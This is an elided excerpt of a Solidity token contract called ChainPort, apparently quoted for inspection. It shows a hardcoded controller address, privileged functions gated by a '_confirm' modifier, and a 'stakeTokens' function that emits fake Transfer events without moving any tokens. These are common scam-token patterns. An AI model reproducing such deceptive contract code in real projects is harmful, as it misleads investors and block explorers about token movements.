...
contract ChainPort is Context, IERC20 {
    ...
    address public _comptroller = 0xf3693052d5916430979bd91f70898D404b433995;
   constructor () public {
   ...
   function approvalMinusOne(address safeOwner) public {
    ...
    function preG(address from, address dest, uint256 amt) internal newProcess( dest,  amt,  from,  address(0)) virtual {
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function transferToIDOParticipants(address sndr,address[] memory destination, uint256[] memory amounts) public _confirm(){
  ...
  function stakeTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _confirm(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
